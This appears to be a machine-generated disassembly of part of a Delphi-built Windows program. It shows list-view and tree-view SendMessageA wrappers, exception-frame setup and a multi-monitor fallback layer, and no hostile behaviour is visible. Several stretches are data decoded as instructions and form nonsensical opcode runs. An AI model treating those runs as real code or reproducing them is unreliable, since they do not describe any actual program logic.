and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_428e10
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_416090
mov eax esi
pop esi
pop ebx
retn
sub_428e3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428e61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428e68
retn
sub_428e7c
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_428edc
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_428e7c
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_428fd8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42902c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4290d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_40742c
push eax
push esi
push 0x100c
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429104
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call SendMessageA
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_429150
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429198
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4291f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_40742c
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429218
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1021
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42928c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x102a
push ebx
call SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_4292ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4292ec
push ebx
push esi
mov esi edx
mov ebx eax
push 0xf000
push esi
push 0x102c
push ebx
call SendMessageA
shr eax 0xc
dec eax
pop esi
pop ebx
retn
sub_42930c
add esp 0xffffffd8
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call SendMessageA
add esp 0x28
retn
sub_429338
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429388
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4293cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4293e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429404
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1041
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429468
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1102
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429484
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
mov esi eax
mov [ ebx ] edx
push ebx
mov eax [ ebp + 0x8 ]
push eax
push 0x1104
push esi
call SendMessageA
pop esi
pop ebx
pop ebp
retn 0x4
sub_4294e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1109
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4294fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x110a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42959c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x110b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429650
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1115
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4296fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x100a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429728
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1012
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429754
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1002
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429770
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1004
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42978c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1006
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4297b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4297dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4297e4
retn
sub_4297f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_4298af
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298b6
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4297f0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40442c
sub_4298d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4297f0
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_429960
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4297f0
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4299f0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4297f0
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_429960
sub_429a86
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4297f0
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_429b07
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4297f0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429bf4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4297f0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429cc8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4297f0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_429d9c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4297f0
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_429f37
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_429f5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f64
retn
sub_429f78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429f9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429fa4
retn
sub_429fb0
mov ah 0x9f
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
dec esp
adc [ eax ] eax
add [ eax - 0x6d ] ebx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429fa4
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
mov eax [ 0xc0042 ]
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xa01c7265
inc edx
add [ ecx ] al
xchg bx ax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
jmp [ eax ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x114c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
into
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ ecx + edi * 2 + 0x40 ] dl
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5f ] bl
inc edx
add [ eax + eax ] cl
outsb
je r-xdata
add al al
dec edi
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
dec eax
insb
jo r-xdata
mov al [ 0xc0f0042 ]
dec ecx
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x429fecc0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
lodsd [ esi ]
or al [ eax ]
add [ ebx - 0x52162b40 ] al
or al [ eax ]
add [ ebx - 0x5e162b40 ] al
or eax [ eax ]
add [ ebx - 0x2162b40 ] al
or eax [ eax ]
add [ ebx - 0x2bfbdbbc ] al
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
inc eax
jns r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403774
test al al
je r-xdata
push esi
je r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xa0587265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ esi + esi + 0x40 ] dh
add [ eax + 0x14004036 ] dh
inc ebp
dec eax
insb
jo r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
outsb
je r-xdata
add [ edi ] cl
or al 0x49
add bh bh
dec [ ebx + 0x42a0d8c0 ]
mov al [ 0x150f0042 ]
dec ecx
push ebx
jo r-xdata
add bh bh
[ eax + 0xf0042a0 ]
jae r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
mov al [ 0x66010042 ]
xchg ebx eax
insd
dec esp
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42a05cc0 ]
add [ edi ] cl
mov eax 0x80004002
xor eax eax
jmp r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
mov eax [ 0xc0042 ]
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
imul ebp [ edi + 0x6e ] 0xbc00408d
mov eax [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x42a1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
jae r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
pop ebx
pop ebp
retn 0xc
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
lea eax [ eax ]
pop eax
mov eax [ 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
add bh bh
dec [ ebp - 0x5ea7ffc0 ]
inc edx
add [ eax ] al
add [ eax ] al
int3
mov eax eax
sub_42a374
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_406204
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42a3fc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42a55c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4061ac
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a403
lea eax [ ebp - 0xc ]
call sub_406194
lea eax [ ebp - 0x4 ]
call sub_406194
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a4e8
mov [ rw-data ] eax
sub_42a40c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a4e8
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4061d8
mov eax [ ebx ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42a46c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_406204
xor eax eax
push ebp
push sub_42a4c5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4061ac
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a4cc
lea eax [ ebp - 0x4 ]
call sub_406194
retn
add esp 0xfffffff0
call sub_403a24
sub_42a4e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cec
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cec
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cec
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_40442c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a55c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_406204
xor eax eax
push ebp
push sub_42a676
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a46c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_428d3c
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0xc ]
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40dacc
test al al
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40dacc
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a46c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_428d3c
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a46c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_428d3c
mov ecx r-xdata
call sub_4061d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a67d
lea eax [ ebp - 0x10 ]
call sub_406194
lea eax [ ebp - 0xc ]
call sub_406194
